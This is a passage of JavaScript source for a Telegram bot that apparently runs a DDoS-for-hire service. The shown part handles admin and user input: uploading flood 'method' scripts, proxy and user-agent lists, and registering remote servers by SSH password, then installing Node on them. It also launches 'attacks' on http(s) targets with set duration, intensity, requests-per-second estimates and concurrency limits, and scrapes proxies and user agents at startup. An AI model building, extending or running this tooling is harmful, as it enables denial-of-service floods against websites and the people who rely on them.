  if (!msg.text && !msg.document) return;
  const text = msg.text ? msg.text.trim() : '';

  if (!botIsOnline() && !isAdmin(msg.from.id)) {
    if (text === '/cancel') { pendingInput.delete(msg.from.id); return reply(msg, '❎'); }
    return sendMaintenance(msg);
  }
  if (text.startsWith('/')) {
    if (text === '/cancel') { pendingInput.delete(msg.from.id); return reply(msg, '❎'); }
    return;
  }

  const pending = pendingInput.get(msg.from.id);
  if (!pending || (pending.expires && Date.now() > pending.expires)) return;

  const user = ensureUser(msg);
  const data = pending.data || {};

  if (pending.action === 'botctl_msg') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    pendingInput.delete(msg.from.id);
    store.botstate.mutate(s => { s.maintenanceMsg = text; s.lastToggleBy = msg.from.id; });
    await reply(msg, `✅ Updated:\n\n<i>${esc(text)}</i>`);
    return showBotControl(msg.chat.id);
  }
  if (pending.action === 'broadcast_msg') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    pendingInput.delete(msg.from.id);
    const users = Object.values(store.users.get()).filter(u => u.role === 'admin' || u.role === 'user');
    let ok = 0, fail = 0;
    for (const u of users) {
      try { await bot.sendMessage(u.telegramId, `📢 <b>${BRAND}</b>\n\n${esc(text)}`, { parse_mode: 'HTML' }); ok++; }
      catch { fail++; }
      await new Promise(r => setTimeout(r, 50));
    }
    return reply(msg, `✅ ${ok} · ❌ ${fail}`);
  }
  if (pending.action === 'preset_name') {
    if (!/^[a-zA-Z0-9_-]{2,20}$/.test(text)) return reply(msg, '❌ 2-20 chars');
    if (store.presets.get()[text]) return reply(msg, '❌ exists');
    data.name = text;
    pending.action = 'preset_method';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `✅ Name: <code>${text}</code>\n\nStep 2/3 — Method ID:\n${allMethods().map(m => `<code>${m.id}</code>`).join(', ')}`);
  }
  if (pending.action === 'preset_method') {
    if (!getMethod(text)) return reply(msg, '❌ Unknown');
    data.method = text;
    pending.action = 'preset_threads';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `✅ Method: <b>${text}</b>\n\nStep 3/3 — Threads & rate (e.g. <code>16 90</code>):`);
  }
  if (pending.action === 'preset_threads') {
    const parts = text.split(/\s+/);
    const threads = parseInt(parts[0], 10);
    const rate = parseInt(parts[1], 10);
    if (!threads || !rate) return reply(msg, '❌ Format: <code>16 90</code>');
    store.presets.mutate(p => { p[data.name] = { method: data.method, threads, rate, duration: 60 }; });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Preset @${data.name}`);
    return showAdminPresets(msg.chat.id);
  }
  if (pending.action === 'set_group') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    const sId = data.serverId;
    const val = text === '-' ? null : text;
    upsertServer({ id: sId, group: val });
    if (val) store.groups.mutate(g => { if (!g.includes(val)) g.push(val); });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Tag ${val ? `<code>${esc(val)}</code>` : 'cleared'}`);
    return showServerActions(msg.chat.id, null, sId);
  }
  if (pending.action === 'srv_set_port') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    const v = parseInt(text, 10);
    if (!v || v < 1 || v > 65535) return reply(msg, '❌ 1-65535');
    const sId = data.serverId;
    upsertServer({ id: sId, port: v });
    serverConns.delete(sId);
    healthCache.delete(sId);
    remoteEnvCache.delete(sId);
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Port → ${v}\n\n<i>Try Test SSH now.</i>`);
    return showServerActions(msg.chat.id, null, sId);
  }
  if (pending.action === 'set_mcooldown') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0 || v > 3600) return reply(msg, '❌ 0-3600');
    updateMethodState(data.methodId, { minCooldown: v });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Cooldown → ${v || 0}s`);
    return showAdminMethodDetail(msg.chat.id, null, data.methodId);
  }

  if (pending.action === 'ua_file') {
    if (!msg.document) return reply(msg, '❌ .txt file');
    const fn = msg.document.file_name || 'ua.txt';
    if (!fn.endsWith('.txt')) return reply(msg, '❌ .txt');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const r = await axios.get(link, { responseType: 'text', timeout: 30000 });
      const rawLines = String(r.data).split(/\r?\n/);
      const valid = rawLines.filter(l => isValidUA(l));
      const existing = readUAs();
      const combined = [...new Set([...existing, ...valid.map(s => s.trim())])];
      saveUAs(combined);
      pendingInput.delete(msg.from.id);
      const skipped = rawLines.length - valid.length;
      await reply(msg, `✅ +${valid.length} · ${combined.length} total${skipped > 0 ? ` · ${skipped} skipped` : ''}`);
      return showAdminUA(msg.chat.id);
    } catch (e) { pendingInput.delete(msg.from.id); return reply(msg, `❌ ${esc(e.message)}`); }
  }

  if (pending.action === 'proxy_file') {
    if (!msg.document) return reply(msg, '❌ .txt');
    const fn = msg.document.file_name || 'p.txt';
    if (!fn.endsWith('.txt')) return reply(msg, '❌ .txt');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const r = await axios.get(link, { responseType: 'text', timeout: 30000 });
      const lines = String(r.data).split(/\r?\n/).map(l => l.trim()).filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(l));
      const combined = [...new Set([...readProxies(), ...lines])];
      saveProxies(combined);
      pendingInput.delete(msg.from.id);
      await reply(msg, `✅ +${lines.length} · ${combined.length}`);
      return showAdminProxies(msg.chat.id);
    } catch (e) { pendingInput.delete(msg.from.id); return reply(msg, `❌ ${esc(e.message)}`); }
  }
  if (pending.action === 'am_file') {
    if (!msg.document) return reply(msg, '❌ .js');
    const fn = msg.document.file_name || 'method.js';
    if (!fn.endsWith('.js')) return reply(msg, '❌ .js');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const tp = path.join(CONFIG.SCRIPT_DIR, fn);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((res, rej) => { const w = fs.createWriteStream(tp); r.data.pipe(w); w.on('finish', res); w.on('error', rej); });
      const check = await validateMethodFile(fn);
      if (!check.ok) return reply(msg, `❌ ${esc(check.error)}`);
      data.fileName = fn;
      pending.action = 'am_id';
      pendingInput.set(msg.from.id, pending);
      const detected = scanMethodDeps(fn);
      const detectedAux = scanMethodAux(fn);
      const lines = [];
      if (detected.length) lines.push(`npm: ${detected.join(', ')}`);
      if (detectedAux.length) lines.push(`aux: ${detectedAux.join(', ')}`);
      const info = lines.length ? `\n\n<i>${lines.join(' · ')}</i>` : '\n\n<i>No external deps</i>';
      return reply(msg, `✅ <code>${fn}</code>${info}\n\nStep 2/4 — Method ID:`);
    } catch (e) { pendingInput.delete(msg.from.id); return reply(msg, `❌ ${esc(e.message)}`); }
  }
  if (pending.action === 'am_id') {
    if (!/^[a-zA-Z0-9_-]{2,20}$/.test(text)) return reply(msg, '❌ 2-20 chars');
    if (allMethods().some(m => m.id === text.toLowerCase())) return reply(msg, '❌ exists');
    data.methodId = text.toLowerCase();
    pending.action = 'am_sample';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `✅ ID: <code>${data.methodId}</code>\n\nStep 3/4 — Sample command:\n<code>node ${data.fileName} https://ex.com 1200 proxy.txt 8 8000</code>`);
  }
  if (pending.action === 'am_sample') {
    const result = parseSampleCommand(text);
    if (!result.ok) return reply(msg, `❌ ${esc(result.error)}`);
    data.template = result.template;
    data.sampleCmd = text;
    data.warnings = result.warnings;
    pending.action = 'am_confirm';
    pendingInput.set(msg.from.id, pending);
    let preview = '';
    try { const a = buildArgsFromTemplate(result.template, 'https://ex.com', '60', '16', '90'); preview = `node ${data.fileName} ${a.map(x => /\s/.test(x) ? `"${x}"` : x).join(' ')}`; } catch {}
    const txt = [`✅ <b>Parsed</b>`, ``, `Template:`, `<code>${esc(result.template)}</code>`, ``, `Will run:`, `<code>${esc(preview)}</code>`];
    if (result.warnings.length) { txt.push(''); result.warnings.forEach(w => txt.push(`⚠️ ${esc(w)}`)); }
    txt.push('', '<b>Save?</b>');
    return bot.sendMessage(msg.chat.id, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[btn('✅ Save', 'addmethod_save', 'success')], [btn('❌ Cancel', 'addmethod_cancel', 'danger')]] } });
  }
  if (pending.action === 'quick_target') {
    if (!/^https?:\/\//i.test(text)) return reply(msg, '❌ http(s)://');
    try { validateTarget(text); } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    pending.action = 'quick_duration';
    data.target = text;
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `<b>Step 2/3</b> — Duration (sec, 1-3600):`, { parse_mode: 'HTML' });
  }
  if (pending.action === 'quick_duration') {
    const dur = parseInt(text, 10);
    if (!dur || dur < 1 || dur > 3600) return reply(msg, '❌ 1-3600');
    const { methodId, target } = data;
    pendingInput.delete(msg.from.id);
    const method = getMethod(methodId);
    if (!method) return reply(msg, '❌ gone');
    if (!isMethodEnabled(method.id)) return reply(msg, '🔴');
    if (!userCanUseMethod(user, method.id)) return reply(msg, '🔒');
    const cd = getCooldownLeft(msg.from.id);
    if (cd > 0) return reply(msg, `⏳ ${cd}s`);
    const conc = user.limits?.maxConcurrent || 0;
    if (conc > 0 && userActiveBatches(msg.from.id) >= conc) return reply(msg, `❌ Max ${conc} concurrent attacks`);
    try {
      checkUserLimits(user, dur, 0, 0);
      if (isBlacklisted(normalizeHost(target))) throw new Error('blacklisted');
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return showIntensityMenu(msg.chat.id, user.telegramId, methodId, target, String(dur));
  }
  if (pending.action === 'as_addr') {
    if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ ip:port (contoh: 1.2.3.4:22 atau 1.2.3.4:2222)');
    data.addr = text;
    pending.action = 'as_user';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '👤 SSH user:');
  }
  if (pending.action === 'as_user') {
    data.username = text;
    pending.action = 'as_pass';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '🔑 SSH pass:');
  }
  if (pending.action === 'as_pass') {
    data.password = text;
    pendingInput.delete(msg.from.id);
    try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}

    const [host, portStr] = data.addr.split(':');
    const port = parseInt(portStr, 10);
    const id = newServerId();
    const sm = await reply(msg, `🧪 Step 1/2 — Testing TCP ${host}:${port}…`);

    const tcp = await tcpProbe(host, port, 5000);
    if (!tcp.ok) {
      await edit(msg.chat.id, sm.message_id,
        `❌ <b>TCP gagal ke ${host}:${port}</b>\n\n<i>${esc(tcp.err || 'unknown')}</i>\n\n` +
        `💡 <b>Yang harus dicek:</b>\n` +
        `• SSH port bukan ${port}? coba 2222 / 22022 / cek panel provider\n` +
        `• Firewall target nge-blok IP VPS bot ini?\n` +
        `• Server target beneran nyala & reachable?\n\n` +
        `Coba lagi: <code>/sshtest ${host}:${port}</code>`);
      return;
    }

    await edit(msg.chat.id, sm.message_id, `✅ TCP open\n🔑 Step 2/2 — Testing SSH auth…`);

    const server = { id, host, port, username: data.username, password: data.password, name: '', status: 'testing', addedBy: msg.from.id, addedAt: new Date().toISOString() };
    try {
      const conn = await sshConnect(server);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);
      let env = null;
      try {
        env = await collectRemoteEnv(id, conn);
        if (!env.nodePath && CONFIG.AUTO_PROVISION) {
          await edit(msg.chat.id, sm.message_id, `⚡ installing node…`);
          env = await provisionRemote(id, conn, (m) => edit(msg.chat.id, sm.message_id, `⚡ ${esc(m)}`).catch(() => {}));
        } else if (env.nodePath) {
          try {
            await edit(msg.chat.id, sm.message_id, `📦 installing deps…`);
            await ensureDepsOnRemote(conn, id, env, (m) => edit(msg.chat.id, sm.message_id, `📦 ${esc(m)}`).catch(() => {}));
          } catch {}
        }
      } catch (e) { console.error('[addserver provision]', e.message); }
      conn.end();
      upsertServer({ ...server, status: 'online', lastCheck: Date.now() });
      renumberServers();
      const added = getServer(id);
      const hw = env ? hardwareBadge(env) : '';
      const estRps = env?.cores ? estimateNodeRps(env.cores) : 0;
      const eligible = INTENSITY.extreme.minCores <= (env?.cores || 0);
      const eligibleLine = env?.cores ? `\nEst. max RPS: <b>~${formatNum(estRps)}</b> · Extreme: ${eligible ? '✅' : '❌'}` : '';
      const nodeLine = env?.nodePath ? `\nNode: <code>${esc(env.nodePath)}</code> v${esc(env.version || '?')}` : `\n⚠️ node not installed`;
      const depsLine = env?.nodePath ? `\nDeps: ${remoteDepsCache.get(id)?.ok ? '✅' : '⚠️'}` : '';
      await edit(msg.chat.id, sm.message_id,
        `✅ <b>Added as ${esc(added.name)}</b>\n<code>${host}:${port}</code>${hw ? `\nHW: <b>${hw}</b>` : ''}${eligibleLine}${nodeLine}${depsLine}\n<i>by ${msg.from.id}</i>`);
    } catch (e) {
      await edit(msg.chat.id, sm.message_id,
        `❌ <b>SSH auth gagal</b>\n\n<code>${esc(e.message.slice(0, 300))}</code>\n\n` +
        `💡 Kalau TCP open tapi auth gagal: password salah, atau server key-only.`);
    }
    return;
  }
  if (pending.action === 'set_dur') {
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0) return reply(msg, '❌ number');
    const u = getUser(data.targetId);
    if (!u) return reply(msg, '❌ gone');
    upsertUser(data.targetId, { limits: { ...(u.limits || {}), maxDuration: v } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Dur: ${v || '∞'}`);
    return showUserActions(msg.chat.id, null, data.targetId, msg.from.id);
  }
  if (pending.action === 'set_conc') {
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0) return reply(msg, '❌ number');
    const u = getUser(data.targetId);
    if (!u) return reply(msg, '❌ gone');
    upsertUser(data.targetId, { limits: { ...(u.limits || {}), maxConcurrent: v } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Concurrent attacks: ${v || '∞'}`);
    return showUserActions(msg.chat.id, null, data.targetId, msg.from.id);
  }
  if (pending.action === 'set_maxsrv') {
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0) return reply(msg, '❌ number');
    const u = getUser(data.targetId);
    if (!u) return reply(msg, '❌ gone');
    upsertUser(data.targetId, { limits: { ...(u.limits || {}), maxServers: v } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Servers/attack: ${v || '∞'}`);
    return showUserActions(msg.chat.id, null, data.targetId, msg.from.id);
  }
});

/* ══════════════════════════════════════════════════════════════════════════
   STARTUP
   ══════════════════════════════════════════════════════════════════════════ */

(async () => {
  console.log(`[bot] starting ${BRAND} ${VERSION}`);
  console.log('[bot] dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] owners:', CONFIG.ADMIN_IDS);
  console.log('[bot] concurrency:', CONFIG.MAX_CONCURRENT_PER_SERVER, 'per server');
  console.log('[bot] mode: REMOTE-ONLY');

  const all = allMethods();
  const present = all.filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
  console.log('[bot] methods:', present.map(m => `${m.emoji}${m.id}`).join(' ') || '(none)');
  const missing = all.filter(m => !fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
  if (missing.length) console.log('[bot] methods missing:', missing.map(m => `${m.id}(${m.file})`).join(', '));

  const allDeps = getAllMethodDeps();
  const pinned = allDeps.filter(d => PINNED_VERSIONS[d]);
  console.log(`[bot] detected ${allDeps.length} npm deps${pinned.length ? ` (${pinned.map(depDisplay).join(', ')} pinned)` : ''}`);
  console.log(`[bot] proxies: ${readProxies().length} · UAs: ${readUAs().length}`);

  for (const id of CONFIG.ADMIN_IDS) {
    const u = getUser(id);
    if (!u) {
      upsertUser(id, { telegramId: id, role: 'admin', isOwner: true, createdAt: new Date().toISOString(), limits: { ...ADMIN_LIMITS }, allowedMethods: null });
      console.log(`[bot] owner ${id} bootstrapped`);
    } else if (u.role !== 'admin') {
      upsertUser(id, { role: 'admin', limits: { ...ADMIN_LIMITS } });
      console.log(`[bot] owner ${id} role restored`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] @${me.username} ready`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  await startPollingSafe();

  const servers = store.servers.get();
  if (servers.length) {
    prewarmServers(servers.map(s => s.id)).then(() => {
      const online = servers.filter(s => serverConns.has(s.id)).length;
      console.log(`[bot] ${online}/${servers.length} servers connected`);
    });
  }

  if (!fs.existsSync(FILES.proxies) || readProxies().length === 0) {
    console.log('[bot] scraping proxies…');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch {}
  }

  if (!fs.existsSync(FILES.ua) || readUAs().length === 0) {
    console.log('[bot] scraping UAs…');
    try { console.log(`[bot] ${await scrapeUAs()} UAs`); } catch {}
  }

  const running = Object.values(store.sessions.get()).filter(s => s.status === 'running');
  if (running.length > 0) {
    if (CONFIG.RESUME_ON_START) {
      store.sessions.mutate(all => { for (const s of Object.values(all)) if (s.status === 'running') { s.status = 'stale'; s.staleAt = Date.now(); } });
    } else { stopAllSessions(null); }
  }
})();

function shutdown(sig) {
  console.log(`\n[bot] ${sig} received`);
  for (const st of Object.values(store)) st.flush?.();
  setTimeout(() => process.exit(0), 500);
}
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException', e => console.error('[uncaught]', e));
process.on('unhandledRejection', e => console.error('[rejection]', e));